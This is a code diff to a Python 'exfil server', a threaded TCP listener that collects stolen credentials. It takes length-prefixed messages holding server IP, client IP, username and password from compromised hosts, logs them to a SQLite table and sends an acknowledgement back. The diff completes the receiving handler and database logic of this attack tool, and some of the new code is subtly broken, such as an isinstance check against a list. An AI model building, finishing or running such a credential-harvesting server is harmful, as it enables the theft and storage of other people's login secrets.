@@ -4,9 +4,10 @@ import argparse
 import pathlib
 import socketserver
 import sqlite3
-import struct
 
 from ipaddress import IPv4Address
+from struct import pack, unpack
+from sys import exc_info
 
 INFO="\033[94m[i] "
 SUCCESS="\033[92m[*] "
@@ -26,7 +27,6 @@ def handle_file(file):
         if (path.is_file()):
             # Ensure DB schema is valid, otherwise exit
             if (validate_db(path)):
-                server.db = path
                 print(f"{SUCCESS}Using existing database '{path}'{RESET}")
             else:
                 print(f"{ERROR}Database validation failed. Exiting...{RESET}")
@@ -45,7 +45,7 @@ def validate_db(db_name):
     with sqlite3.connect(db_name) as conn:
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
-        table_count = cursor.execute("SELECT COUNT(*) FROM sqlite_schema")
+        table_count = cursor.execute("SELECT COUNT(*) FROM sqlite_schema WHERE type = 'table'")
         results = table_count.fetchall()
         if len(results) > 1:
             print(f"{WARNING}There's more than 1 table in this database{RESET}")
@@ -76,11 +76,12 @@ def init_db(path):
         # Another way to do it is to change password to passwords and collect them all in JSON so all rows represent unique IPs with all seen passwords. Same thing with the client_ip column
         cursor.execute("""
             CREATE TABLE credentials (
-                server_ip VARCHAR(25) NOT NULL,
-                client_ip VARCHAR(25) NOT NULL,
-                username VARCHAR(50) NOT NULL,
-                password VARCHAR(100) NOT NULL
+                server_ip VARCHAR(25) UNIQUE NOT NULL,
+                client_ip VARCHAR(25) UNIQUE NOT NULL,
+                username VARCHAR(50) UNIQUE NOT NULL,
+                password VARCHAR(100) UNIQUE NOT NULL
             )""")
+        
     conn.close()
     
 
@@ -88,37 +89,60 @@ class Handler(socketserver.StreamRequestHandler):
     timeout = 5.0
 
     def handle(self):
-        # ----- UNFINISHED FUNCTION -----
-        print(f"{SUCCESS}Connection received from {self.client_address}")
-        while True:
-            recv_len = self.rfile.read(4)
-            if not recv_len:
-                print(f"{INFO}{self.client_address}: Client disconnected")
-                break
-            if len(recv_len) != 4:
-                print(f"{ERROR}{self.client_address}: Connection interrupted. Incomplete length prefix")
-                break
+        print(f"{SUCCESS}Connection received from {self.client_address}{RESET}")
+        recv_len = self.rfile.read(4)
+        if not recv_len:
+            print(f"{INFO}{self.client_address}: Client disconnected")
+            return
+        if len(recv_len) != 4:
+            print(f"{ERROR}{self.client_address}: Connection interrupted. Incomplete length prefix")
+            return
 
-            length = struct.unpack("!I", recv_len)[0]
-            data = self.rfile.read(length).decode()
-            if not data:
-                print(f"{INFO}Client '{self.client_address}' disconnected")
-                break
-            if len(data) != length:
-                print(f"{ERROR}{self.client_address}: Connection interrupted. Incomplete data payload")
-                break
+        length = unpack("!I", recv_len)[0]
+        data = self.rfile.read(length).decode()
+        if not data:
+            print(f"{INFO}Client '{self.client_address}' disconnected")
+            return
+        if len(data) != length:
+            print(f"{ERROR}{self.client_address}: Connection interrupted. Incomplete data payload")
+            return
 
-            parsed_data = data.split("|")
+        parsed_data = data.split("|")
+        with sqlite3.connect(self.server.db) as conn:
+            unique = False
+            cursor = conn.cursor()
+            query = "INSERT INTO credentials VALUES (?, ?, ?, ?)"
+            try:
+                cursor.execute(query, parsed_data)
+                unique = True
+            except sqlite3.IntegrityError:
+                print(f"{SUCCESS}{parsed_data[1]} --> {parsed_data[0]}: Authenticated with existing credentials {parsed_data[2]}:{parsed_data[3]}{RESET}")
 
+        conn.close()
+        if unique:
+            print(f"{SUCCESS}Database updated. New entry: {parsed_data[1]} --> {parsed_data[0]} with creds {parsed_data[2]}:{parsed_data[3]}{RESET}")
+
+        self.wfile.write(pack("!I", 1)) # Send the ACK value to the client
+        self.wfile.flush()
+        print(f"{INFO}ACK value sent to client '{self.client_address}'{RESET}\n")
+
+    def handle_error(self, request, client_address):
+        exc = exc_info()[1]
+        if isinstance(exc, [ConnectionResetError, BrokenPipeError]):
+            print(f"{ERROR}{self.client_address}: Connection Reset or Broken Pipe Error occurred{RESET}")   
+        elif isinstance(exc, TimeoutError):
+            print(f"{ERROR}{self.client_address}: Timeout occurred{RESET}")
+        else:
+            super().handle_error(request, client_address)
 
 
 if __name__ == "__main__":
     epilogue = """This program defines the credentials table as the following:
     CREATE TABLE credentials (
-        server_ip VARCHAR(25) NOT NULL,
-        client_ip VARCHAR(25) NOT NULL,
-        username VARCHAR(50) NOT NULL,
-        password VARCHAR(100) NOT NULL
+        server_ip VARCHAR(25) UNIQUE NOT NULL,
+        client_ip VARCHAR(25) UNIQUE NOT NULL,
+        username VARCHAR(50) UNIQUE NOT NULL,
+        password VARCHAR(100) UNIQUE NOT NULL
     );
 
     If the user specifies an existing database, it must contain only this table exactly as defined, otherwise the program will reject it"""
@@ -133,9 +157,11 @@ if __name__ == "__main__":
         handle_file(args.db)
     else:
         print(f"{INFO}Checking for db file './cipher.db'{RESET}")
-        handle_file("./cipher.db")
+        args.db = "./cipher.db"
+        handle_file(args.db)
 
-    with socketserver.ThreadingTCPServer((args.server_ip, args.server_port), Handler) as server:        
-        print(f"{INFO}Exfil server listening on {args.server_ip}:{args.server_port}...{RESET}")
+    with socketserver.ThreadingTCPServer((args.server_ip, args.server_port), Handler) as server:
+        server.db = args.db
+        print(f"{INFO}Exfil server listening on {args.server_ip}:{args.server_port}...{RESET}\n")
         server.allow_reuse_address = True
         server.serve_forever()
